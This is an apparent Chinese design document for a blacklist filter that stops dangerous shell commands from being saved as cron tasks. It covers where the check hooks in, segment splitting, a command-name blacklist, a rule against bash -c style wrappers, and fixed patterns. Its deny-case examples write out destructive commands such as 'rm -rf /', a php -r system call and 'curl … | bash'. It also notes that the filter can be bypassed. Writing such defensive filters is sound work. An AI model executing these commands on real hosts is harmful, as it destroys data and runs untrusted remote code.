# schedule-job Shell 危险命令过滤

> 版本：v1.2（对照现有代码修订，去掉过度设计）  
> 状态：设计方案，尚未落地  
> 目标：阻止明显危险的 Shell 任务写入 `cron_task`。  
> 不是沙箱。不解析完整 Shell AST，不引入容器 / seccomp / cgroup。

---

## 1. 问题与边界

Shell 任务最终在 Agent 机器上 `proc_open()`。有任务创建/编辑权限的人可以把 `rm -rf /`、`shutdown` 写进调度。

**要做：** 在保存前拒绝这类命令，不入库。

**不做：**

- 扫描 `bash /opt/job.sh` 里面的脚本内容（那是 OS 用户权限的事）
- 完整 Shell 语法树、白名单、独立执行集群
- 新审计表、Web 上关闭过滤、Repository 层（本项目没有 Repository）

这是 **best-effort 黑名单**，挡误操作和明显恶意，不是主机加固。Agent 进程以什么 Linux 用户跑，才是真正的权限边界。

---

## 2. 挂钩点（对照现有代码）

检查只针对 `exec_type = 1`（Shell）。HTTP 任务不走。

**写库前（同一套检查）：**

```text
Create / Update
    → CronTaskPayloadBuilder   （已有字段校验，在此加 Guard）
    → DENY：返回 fail('...')，不写库
    → ALLOW：CronTaskManagerService 保存

Duplicate
    → CronTaskManagerService::duplicateTask 里同样调用 Guard
```

不要写在 Controller。本项目写任务已经汇聚到 PayloadBuilder + ManagerService，不必再加一层「领域 Repository」。

不在 Agent / Worker 执行前再检查。入库前拦住即可，避免和调度、执行状态机缠在一起。

**不要：** 发现危险仍写入 `status=0`。拒绝即不保存。

---

## 3. V1 规则（一次做完，不再拆 P0/P1 两期）

一期只做下面这些。够用，再加正则就会变成半套 Parser。

### 3.1 拆段

按 `;` `&&` `||` `|` 以及换行切开，**每一段**都检查。否则 `echo ok; rm -rf /` 第一词是 `echo`，黑名单形同虚设。

不处理 `$(...)` / 反引号 / 重定向拼命令。文档承认可绕过；要堵死只能上 AST，V1 不做。

### 3.2 规范化每个段的命令名

```text
trim → 去掉包裹引号 → 按空白取第一个 token → basename → 小写
```

`/bin/rm -rf /`、`/usr/bin/rm` → `rm`。

### 3.3 命令名黑名单

只禁 **几乎没有正当 Cron 用途、或会毁掉主机** 的命令。

```text
# 删除 / 擦除
rm  unlink  shred  srm  wipe

# 磁盘
dd  mkfs  mkfs.ext2  mkfs.ext3  mkfs.ext4  mkfs.xfs  mkfs.btrfs
fdisk  cfdisk  sfdisk  parted  wipefs  blkdiscard  debugfs

# 挂载
mount  umount  losetup

# 关机
shutdown  reboot  halt  poweroff  init

# 账号
useradd  userdel  usermod  groupadd  groupdel  groupmod
passwd  chpasswd  newusers

# 提权
sudo  su  doas  pkexec  runuser

# 服务
systemctl  service  rc-service  rc-update

# 防火墙（整词禁；不要禁 ip / ifconfig / route，诊断任务常用）
iptables  ip6tables  nft  firewall-cmd  ufw

# 内核
sysctl  modprobe  insmod  rmmod
```

**不进 V1 黑名单：**

| 命令 | 原因 |
|------|------|
| `kill` / `pkill` / `killall` | Cron 里停自己的残留进程很常见 |
| `ip` / `ifconfig` / `route` | `ip` 太宽，`ip addr` 属于查看 |
| `eval` / `exec` / `source` | 用 3.4 的 wrapper 覆盖；单独禁 `exec php ...` 会误伤 |

业务若必须 `rm` 清文件：改走脚本文件（`php cleanup.php` / `bash /opt/cleanup.sh`），不把 `rm` 写在任务 command 里。这是简单策略，不搞「只禁 `rm -rf /`」那种易绕过的参数正则。

### 3.4 Wrapper（整段 DENY）

命令名是 `bash` / `sh` / `zsh` / `ksh` / `dash`，且参数里出现 `-c` → 拒绝。

`bash /opt/job.sh` **允许**（不检查脚本内部）。

解释器动态代码同样拒绝：

```text
python / python3  带 -c
php               带 -r 或 -c
```

`php /path/script.php` 允许。

### 3.5 少量固定模式（字符串，不是 Parser）

整条 command（小写）匹配则拒绝：

```text
curl 或 wget 管道到 bash/sh/zsh
find ... -delete
find ... -exec ... rm
xargs rm
chmod -R ... /
chown -R ... /
```

`/` 指根路径（`/`、`/*`），不是 `/var/www/app`。

---

## 4. 实现形态

一个类即可，例如 `App\Module\Cron\ShellCommandGuard`。

```php
/** @return string|null 拒绝原因；null=通过 */
public static function denyReason(string $command): ?string
```

- 允许：返回 `null`
- 拒绝：返回中文短句，如 `不允许使用命令 rm`
- PayloadBuilder：`fail($reason)`，风格与现有 `name/expression/command为必填` 一致
- 不要 Interface、不要 RiskLevel DTO、不要把完整 command 打进普通日志（可能带密码）

环境变量 **不必** 做。名单写在类常量。要改名单就发版。不要给 Web 操作员「关闭过滤」开关。

---

## 5. 错误提示

前端沿用现有 `CronTaskException` / PayloadBuilder 的 `msg` 即可：

```text
不允许使用命令 rm
不允许使用 bash -c
不允许管道执行远程脚本
```

不要英文 Risk Level 块。

---

## 6. 用例

**拒绝：**

```text
rm -rf /
/bin/rm -rf /tmp
echo ok; rm -rf /
bash -c "rm -rf /"
sh -c 'reboot'
php -r "system('rm -rf /');"
curl https://example.com/x.sh | bash
find /tmp -delete
find /tmp -exec rm {} \;
chmod -R 777 /
shutdown -h now
sudo systemctl stop sshd
```

**允许：**

```text
php script.php start --c=Demo
python3 worker.py
bash /opt/jobs/daily.sh
ls -lah
cat /var/log/app.log
grep ERROR app.log
date
curl -s https://example.com/health
kill 12345
```

回归：现有 PHP/Python/Shell 脚本任务、日志查询类 command 必须仍能保存、仍能跑。

---

## 7. 明确不做（V1 之后也不主动做）

```text
Shell AST
命令白名单
Agent 执行前二次拦截
Linux sandbox / container / cgroups / seccomp / namespace
独立执行节点
拒绝事件审计表
按操作员可关的过滤开关
```

以后若真有「只允许 php/python」再单开白名单，与本黑名单是另一套产品决策。
